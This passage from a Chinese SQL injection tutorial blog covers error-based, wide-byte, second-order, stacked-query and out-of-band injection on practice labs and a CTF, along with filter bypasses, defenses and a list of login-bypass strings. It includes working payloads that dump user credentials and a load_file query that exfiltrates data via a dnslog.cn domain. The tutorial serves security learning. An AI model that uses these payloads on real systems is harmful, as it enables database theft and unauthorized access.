alt="这个就是成功延时的结果"></p><p>其他的步骤和布尔盲注相同，只需要把布尔盲注的语句填入if中的第一个参数即可</p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>页面上没有显示位，但是会输出SQL语句执行错误的信息</p><p>人为制造错误条件，使得查询结果能够出现在错误信息中</p><p>适用于联合查询受阻，后台没有屏蔽数据库报错信息，发生错误时会输出错误信息到前端页面</p><p>有的布尔盲注也可以用报错注入</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>开发人员使用了<code>print_r()</code>、<code>mysql_error()</code>、<code>mysqli_connect_error()</code>函数将mysql错误信息输出到前端，因此可以人为地使用一些指定的函数来制造报错信息，从而获取报错信息中特定的信息</p><p>使用常规的union联合查询注入可以发现时无法注出数据的，用盲注又太费时费力，所以可以结合页面的报错信息使用报错注入。</p><h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>从mysql5.1.5开始提供两个用于XML查询和修改的函数，通过XML函数进行报错，来进行注入。</p><ol><li>undatexml()</li></ol><p>语法：updatexml(XML_document，XPath_srting，new_value)参数1：xml文档的名称；参数2：xpath格式的字符串；参数3：替换查找到的符合条件的数据</p><ol start="2"><li>extractvalue()</li></ol><p>语法：extractvalue(xml_frag，xpath_expr)第一个参数：目标xml文档；第二个参数：xpath路径法表示的查找路径</p><blockquote><p>Xpath定位必须是有效的，否则会发生错误，我们可以利用这个特性爆出我们想要的数据</p></blockquote><blockquote><p>注意！！！</p><ol><li>必须是在xpath那里传特殊字符，mysql才会报错，特殊字符可以使用<code>~</code>的16进制<code>0x7e</code>来表示。</li><li>path是一个位置，用了特殊字符就不能再添加参数，所以可以用<code>concat()</code>函数将<code>~</code>和自己想注出的数据进行拼接。concat(str1,str2,str3,)：把str1,str2,str3等字符串无缝拼接起来。</li><li>path只会报错32个字符。（回显是32位，我们在获取表名或列名的时候可以获取，但有时数据太大，我们无法得到所有的内容）</li></ol></blockquote><h2 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="判断是否存在注入，注入类型"><a href="#判断是否存在注入，注入类型" class="headerlink" title="判断是否存在注入，注入类型"></a>判断是否存在注入，注入类型</h3><p>方式和联合查询注入、盲注一样</p><p>输入<code>1</code>和<code>1&#39;</code>，如果输入1页面正常显示，输入1’页面有报错，则说明很有可能存在注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719655826513-138a4a8b-80f0-4d8a-9d9b-874fc40fc37f.png"></p><p>再使用<code>1 and 1=1</code>、<code>1 and 1=2</code>、<code>1&#39; and &#39;1&#39;=&#39;1</code>、<code>1&#39; and &#39;1&#39;=&#39;2</code>来判断注入类型（同样与盲注测试方式一样）</p><h3 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>获取数据库名的意义：src漏洞挖掘、项目，数据库名算敏感信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,database()),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719659409304-6a0b1374-22d9-4a21-aa8f-ba38f9126580.png"></p><p>原因</p><ol><li>首先回到语法格式上：updatexml(XML_document,XPath_string,new_value)，我们必须在XPath_string：这个参数里填充xpath格式的字符串，但是如果我们填充一个不是xpath格式的字符串，就会产生报错，所以语句就变成了updatexml(1,database(),1)，前后两个1是随便填充的内容，目的是满足三个参数。</li><li>由于xpath只会对特殊字符进行报错，这里我们可以用~的16进制<code>0x7e</code>来表示，所以就变成了updatexml(1,0x7e,database(),1)，但是由于数据库无法认识中间的内容，所以就无法成功执行，所以可以用concat()函数把多个字符串合并成一个，就变成了updatexml(1,concat(0x7e,database()),1)</li></ol><h3 id="获取数据库中表名"><a href="#获取数据库中表名" class="headerlink" title="获取数据库中表名"></a>获取数据库中表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">更改updatexml中的xpath参数的concat函数中的第二个参数内容</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;)),1)%23</span><br><span class="line"></span><br><span class="line">里面的select语句加（）的原因是：concat函数不允许里面有空格，要用括号使里面的查询为一个整体</span><br></pre></td></tr></table></figure><h4 id="遇见问题"><a href="#遇见问题" class="headerlink" title="遇见问题"></a>遇见问题</h4><table><thead><tr><th>问题描述</th><th>方法</th></tr></thead><tbody><tr><td>Subquery returns more than 1 row<br/>子查询返回多于一行</td><td>1. 使用limit()（修改limit第一个参数以至于获取每一行）<br/><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719661086870-15a454a3-187d-4be6-a60c-504345758e41.png"><br/>2. 使用group_concat()<br/><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719661030846-ddcd6e11-f3a2-47a1-8895-683fedb41e2b.png"></td></tr><tr><td>数据库中的表更多，内容字段和大于32位，导致无法一次性显示出来</td><td>使用substr()截取<br/>先截取前32位，再截取后32位，分步获取<br/>1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),1,32),1)%23</td></tr></tbody></table><h3 id="获取表中字段名"><a href="#获取表中字段名" class="headerlink" title="获取表中字段名"></a>获取表中字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719661869141-a7ce4ceb-2bd7-4d71-a07b-17fc28269013.png"></p><h3 id="获取表中记录"><a href="#获取表中记录" class="headerlink" title="获取表中记录"></a>获取表中记录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users)),1)%23</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from users),1,32)),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719671478707-f1b009d0-c198-4ad1-b945-94b8cde0bc58.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719671310732-49ae184c-d00b-4692-8d66-cc1f42aaa8f2.png" alt="先看前32位"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719671343487-5c637e32-c21f-4183-ad3f-429a0ed84088.png" alt="再看从32位开始往后32位的字符，以此类推"></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><blockquote><p>是一种绕过方式</p></blockquote><p>一个字符的大小是一个字节-&gt;窄字节</p><p>一个字符的大小是两个字节-&gt;宽字节</p><p>像GB2321、GBK、GB18030、B1G5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两个字节。</p><p>英文默认占一个字节，中文占两个字节</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>网站对SQL注入做了防护，例如使用一些MySQL中的转义函数addslashes、mysql_real_escape_string、mysql_escape_string、等（还有一种是php配置文件的magic_quote_gpc设置，不过php高版本已经移除此功能）。这些函数就是过滤用户输入的一些数据，对特殊字符加上反斜杠<code>\</code>进行转义。</p><p>可以使用宽字节注入绕过<code>\</code>转义</p><p>宽字节注入指的是MySQL数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入<code>&#39;</code>时，MySQL会调用转义函数，将单引号变为<code>\&#39;</code>，其中<code>\</code>的十六进制是5c,，MySQL的GBK编码，会认为<code>%df%5c</code>是一个宽字节，也就是<code>運</code>，从而使单引号闭合（逃逸），进行注入攻击。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27===&gt;(addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運’</span><br><span class="line">//输入%df&#x27;===&gt;经过addslashes函数进行转义====&gt;转义为%df%5c%27====&gt;经过(GBK)编码====&gt;变成 運&#x27;</span><br><span class="line">用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</span><br></pre></td></tr></table></figure><blockquote><p>当mysql_query(“SET NAMES gbk”)在代码层被写入时，三个字符集（客户端、连接层、结果集）都是GBK编码</p></blockquote><h2 id="注入流程-3"><a href="#注入流程-3" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><ol><li>输入<code>1&#39;</code>，addslashes函数将<code>&#39;</code>转义为<code>\&#39;</code></li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719673635068-db75f835-c434-4c68-9cb5-c2eda37ec543.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%df&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>输入1%df’，此时转义后%df%5c结合形成一个汉字，查询成功而引起报错，说明存在注入</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719673758734-25510b58-d3c9-4e5f-ac32-d1a258e7d265.png"></p><ol start="3"><li>结尾添加注释使单引号闭合，按照正常方法注入即可</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%df&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719673855219-c6ab440b-3fba-4246-9eef-2980055a6a5e.png"></p><h3 id="注入（使用联合查询注入）"><a href="#注入（使用联合查询注入）" class="headerlink" title="注入（使用联合查询注入）"></a>注入（使用联合查询注入）</h3><p>步骤和正常注入一样：</p><p>获取字段数、确定显示位、注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,database() --+</span><br><span class="line">//查看数据库名</span><br></pre></td></tr></table></figure><p>表名和列名要用<code>&#39;</code>引起来，该怎么注入？</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719674665669-170d2be9-2885-4049-a4ca-5242727b94e4.png"></p><p>不能直接在单引号前面再加上%df，同样会使查询内容改变，查询错误</p><p><strong>使用十六进制（HEX）编码</strong></p><p>将我们需要单引号引起来的内容（数据库名、表名、列名）进行十六进制编码，并再编码后前面加上0x</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719674966508-c6418feb-07f5-4830-ade2-b428923e66de.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719674956141-88bec04a-1788-4523-bf0f-bdc6be9e880d.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719675032910-3e1f6b60-8fac-4bd1-8550-bdbc8b9d0978.png" alt="使用group_concat"></p><blockquote><p>不是所有情况下的表名列名都要用HEX编码（是只有单引号引起来的需要）！</p></blockquote><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>黑盒思路：分析功能有添加后对数据操作的地方（功能点）（很难测出，sql语句的符号影响，转义不能直接看出，容错处理代码中是否有，找到在哪里触发（执行置入的sql语句））</p><p>白盒思路：insert后进入select或update的功能的代码块（源代码去审）</p><p>注入条件：插入时有转义函数或配置，后续有利用插入的数据（先插入后利用）</p><blockquote><p>有转义函数，（’转义为 &#39;）数据才能正常写入，才能二次注入</p><h5 id="实现二次注入，源码中有对应的转义（magic-quotes-gpc（魔术引号转义））或使用转义函数（addslashes）"><a href="#实现二次注入，源码中有对应的转义（magic-quotes-gpc（魔术引号转义））或使用转义函数（addslashes）" class="headerlink" title="实现二次注入，源码中有对应的转义（&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;magic_quotes_gpc（魔术引号转义）&lt;/font&gt;）或使用转义函数（&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;addslashes&lt;/font&gt;）"></a><font style="color:rgb(79, 79, 79);">实现二次注入，</font><font style="background-color:rgba(255, 255, 255, 0);">源码中有</font><strong><font style="background-color:rgba(255, 255, 255, 0);">对应的转义（</font></strong><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;magic_quotes_gpc（魔术引号转义）&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">）或使用转义函数（</font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;addslashes&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">）</font></h5><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732003997510-027cfa63-fb33-4410-be38-8665228ea66d.png"></p></blockquote><p>原理：</p><p>注册新用户时，将注入的内容包含在注册的用户名后：</p><p>admin’ and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#</p><p>成功注入，并查看数据库，数据库中也存放了响应的注入语句</p><p>正常登录：登陆后，随便输入旧密码和新密码，点击修改后，由于在登录状态下修改密码时，使用了update的sql语法，将我们的用户名带入查询，触发了注入，发现注入成功，错误回显版本号</p><p><a href="https://blog.csdn.net/weixin_45663905/article/details/107684251">二次注入——sqli-labs第24关_sqlilabs第24关-CSDN博客</a></p><p>一共三个页面：登录页面、注册页面、忘记密码页面</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719928292834-ec5f8760-84c3-41c1-a045-c2bc0f94d5a1.png"></p><p>看到这里我们可以思考有什么可以注入的地方，在修改密码的时候会带入查询，</p><p>我们先注册一个用户admin’#（为闭合做准备）</p><p>登录后，修改他的密码，我们这里原密码为123546，修改为111111</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719929120461-1784c0eb-0f0b-4285-8209-657c53e88a5a.png"></p><p>回显 显示修改成功</p><p>此时修改的是admin的密码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719929214008-467b344f-5836-40ee-8a29-a2fa10e453ba.png"></p><p>原因就是当我们在修改密码时带入的查询，在修改的用户名处进行了注入，我们的用户名admin’#经过单引号闭合和注释变成了admin，我们修改的就为admin的密码</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，</p><p>例如php中的mysqli_multi_query函数。与之相对应的mysqli_query()只能执行一条SQL，所以要想目标存在堆叠注入，在目标主机存在类似于mysqli_multi_query()这样的函数,根据数据库类型决定是否支持多条语句执行.</p><blockquote><p>简单来讲就是如果使用mysqli_query()则不存在堆叠注入，如果使用mysqli_multi_query()则存在堆叠注入</p></blockquote><p>支持堆叠数据库：MYSQL MSSQL Postgresql等</p><p>条件：</p><p>1.存在sql注入</p><p>2.未对;进行过滤</p><p>3.使用了mysqli_multi_query()</p><p>使用：</p><p>id&#x3D;1;CREATE TABLE xxx(test VARCHAR(255))，在传参之后加;后面可以直接写第二条sql语句让他一起执行</p><p><font style="background-color:rgba(255, 255, 255, 0);"></font></p><p><font style="background-color:rgba(255, 255, 255, 0);">2019强网杯-随便注（CTF题型）</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">‘;show databases;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;show tables;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;show columns from </font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;</code>1919810931114514<code>&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;select flag from </font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;</code>1919810931114514<code>&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;SeT @a&#x3D;0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;<br></font></p><p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;show databases;&lt;/font&gt;</code></p><p><font style="background-color:rgba(255, 255, 255, 0);">这似乎是尝试显示数据库</font></p><p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;show tables;&lt;/font&gt;</code></p><p><font style="background-color:rgba(255, 255, 255, 0);">类似于第一个，似乎是尝试显示表。</font></p><p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;show columns from 1919810931114514;&lt;/font&gt;</code></p><p><font style="background-color:rgba(255, 255, 255, 0);">另一次尝试从具有特定名称的表中显示列。</font></p><p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;select flag from 1919810931114514;&lt;/font&gt;</code></p><p><font style="background-color:rgba(255, 255, 255, 0);">类似于前一个，试图从表中选择名为’flag’的列。确保表和列存在。</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">由于提示不能使用select等，所以使用动态SQL语句，</font></p><p><font style="background-color:rgba(255, 255, 255, 0);">将想要执行的语句，转换为</font><font style="background-color:rgba(255, 255, 255, 0);">Hex（16 进制）</font></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732007082017-36540a59-d481-4584-98e5-73977b287f06.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732007081987-93b2937e-218e-464e-9c6e-c27869468970.png"></p><p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;&lt;/font&gt;</code></p><h1 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h1><p>产生原因：</p><p>有部分注入点是没有回显的，所有读取也是没回显的，采用带外的形式，回显数据</p><p>注入条件：</p><p>ROOT高权限且支持load_file()</p><blockquote><p>secure-file-priv开启（支持load_file()）</p></blockquote><blockquote><p>条件太苛刻了， 而且已经有root权限，且能够load_file()，直接写文件写马进去了</p></blockquote><p>使用：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(select <span class="title function_ invoke__">database</span>()),<span class="string">&#x27;.7logee.dnslog.cn\\aa&#x27;</span>));</span><br></pre></td></tr></table></figure><p>在注入点：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,<span class="title function_ invoke__">database</span>(),<span class="string">&quot;.7logee.dnslog.cn\\asdt&quot;</span>))</span><br></pre></td></tr></table></figure><p>在dnslog平台观察回显</p><h1 id="常见过滤和绕过"><a href="#常见过滤和绕过" class="headerlink" title="常见过滤和绕过"></a>常见过滤和绕过</h1><h2 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h2><p>select等关键字被过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719727906327-5ca499f2-4f3c-4d6d-a4d4-e0c89164045d.png"></p><p>解决方法：</p><ol><li>使用大写绕过（将被过滤的字符改为大写字符）</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719727987635-1da6d698-5153-4715-8dcc-163b654b21df.png"></p><h2 id="函数被过滤"><a href="#函数被过滤" class="headerlink" title="函数被过滤"></a>函数被过滤</h2><p>database()被过滤</p><p>我们更改为大写DATABASE()发现也不能绕过，因为它是对整体database()进行过滤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719728219359-5f9587ff-0e6f-4535-a154-13a5a6c64804.png"></p><p>解决方法：</p><ol><li>注释绕过</li></ol><p>database&#x2F;**&#x2F;()</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719728294785-3e58f5c9-bc7d-4bb4-bfd2-51b7bef92dad.png"></p><h2 id="注释符被过滤"><a href="#注释符被过滤" class="headerlink" title="注释符被过滤"></a>注释符被过滤</h2><p>当我们使用单引号闭合时，我们发现仍显示没有单引号闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719926893280-0da50528-598f-4ae1-ad1a-7b09216e9153.png"></p><p>解决方法：</p><p>使用万能公式1’ and ‘1’&#x3D;’1，在and前构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断列数：</span><br><span class="line">?id=-1&#x27;  union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">我们可以依次增加联合查询的字段数来判断列数</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">获取列名</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">获取具体数据</span><br><span class="line">?id=-1&#x27;  union select 1,(select group_concat(username,&#x27;.&#x27;,password) from users),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h2 id="单引号被过滤"><a href="#单引号被过滤" class="headerlink" title="单引号被过滤"></a>单引号被过滤</h2><p>使用十六进制编码（HEX）编码内容，前面再加上0x<br>SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）</p><blockquote><p>sql文件读取时可以也编码路径</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731939171760-91c70200-23d3-45c7-ac71-d6cd439360d1.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731939171668-a3d198ba-2594-400a-addc-56c7ff95ebd2.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731939171582-d5e4502b-3707-4ad6-8ac1-08c8d73433fd.png"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>对用户输入内容进行过滤</li><li>预编译</li><li>最小权限原则：对于数据库用户要被授予最小权限，避免使用超级用户连接数据库</li><li>错误信息处理限制：返回错误信息时应该设置一个固定的错误信息，避免攻击者通过错误信息获取更多的信息</li></ol><p><strong>预编译为何能够防御SQL注入</strong></p><ol><li><p>分离SQL代码与数据<br>预编译将SQL语句的结构与用户输入的数据分开处理。SQL语句的模板在预编译时固定，用户输入的数据随后以参数形式绑定，确保数据不会被解释为SQL代码。</p></li><li><p>参数化查询<br>预编译使用参数化查询，用户输入的数据作为参数传递，数据库不会将其视为SQL语句的一部分，从而避免了恶意输入改变SQL逻辑。</p></li><li><p>自动转义<br>预编译时，数据库驱动会自动对参数进行转义，确保特殊字符（如单引号）不会被误解为SQL语法的一部分。</p></li><li><p>防止恶意输入<br>由于用户输入被视为数据而非代码，恶意输入无法破坏SQL语句的结构，从而防止了SQL注入攻击。</p></li></ol><p>示例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 非预编译（易受SQL注入）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;user_input&#x27;</span>;</span><br><span class="line"><span class="comment">-- 预编译（防止SQL注入）</span></span><br><span class="line"><span class="keyword">PREPARE</span> stmt <span class="keyword">FROM</span> <span class="string">&#x27;SELECT * FROM users WHERE username = ?&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt <span class="keyword">USING</span> <span class="string">&#x27;user_input&#x27;</span>;</span><br></pre></td></tr></table></figure><p>总结<br>预编译通过分离SQL代码与数据、使用参数化查询和自动转义，有效防止了SQL注入攻击。</p><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h2 id="万能密码登录"><a href="#万能密码登录" class="headerlink" title="万能密码登录"></a>万能密码登录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h2 id="常见head头注入"><a href="#常见head头注入" class="headerlink" title="常见head头注入"></a>常见head头注入</h2><p>常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】</p><p>(1)HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><p>(2)X-Forwarded-For:简称XFF头，它代表客户端，用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</p><p>(3)Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）</p><p>(4)X-Real-IP一般只记录真实发出请求的客户端IP，看下面的例子，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3</span><br><span class="line">　　代表 请求由1.1.1.1发出，经过三层代理，第一层是2.2.2.2，第二层是3.3.3.3，而本次请求的来源IP4.4.4.4是第三层代理</span><br><span class="line">   如果配置了X-Read-IP，将会是：</span><br><span class="line">　　X-Real-IP: 1.1.1.1</span><br><span class="line">　　所以 ，如果只有一层代理，这两个头的值就是一样的</span><br></pre></td></tr></table></figure><p>(5)Accept-Language请求头允许客户端声明它可以理解的自然语言,以及优先选择的区域方言</p><h2 id="如果屏蔽了错误信息显示，如何判断是否存在注入"><a href="#如果屏蔽了错误信息显示，如何判断是否存在注入" class="headerlink" title="如果屏蔽了错误信息显示，如何判断是否存在注入"></a>如果屏蔽了错误信息显示，如何判断是否存在注入</h2><p>如果用户屏蔽了异常信息的显示我们就无法直接通过页面信息确认是否是注入，但是我们可以通过后端响应的状态码来确定是否是注入点，如果返回的状态码为<code>500</code>，那么我们就可以初步的判定<code>user</code>参数存在注入了。</p><h2 id="写shell条件"><a href="#写shell条件" class="headerlink" title="写shell条件"></a>写shell条件</h2><p>在 SQL 注入（SQLi）中，<strong>写 WebShell</strong> 的前提是数据库具有<strong>写入文件的权限</strong>，并且目标环境支持解析<strong>可执行脚本</strong>（如 PHP、ASP、JSP）。一般来说，写 shell 的条件可以归纳如下：  </p><hr><p><strong>1. 目标数据库必须支持写文件</strong></p><p>不同数据库写文件的方式不同，必须满足以下条件：</p><ul><li><strong>MySQL</strong>：需要 <code>FILE</code> 权限，可使用 <code>SELECT ... INTO OUTFILE</code></li><li><strong>MSSQL</strong>：需要 <code>xp_cmdshell</code>、<code>BULK INSERT</code> 或 <code>OPENROWSET</code></li><li><strong>PostgreSQL</strong>：支持 <code>COPY ... TO</code> 直接写入</li><li><strong>Oracle</strong>：可用 <code>UTL_FILE</code> 写入，但需要权限</li></ul><hr><p><strong>2. Web 目录必须可写</strong></p><ul><li>目标数据库可以写入的路径，<strong>必须在 Web 目录下</strong>（如 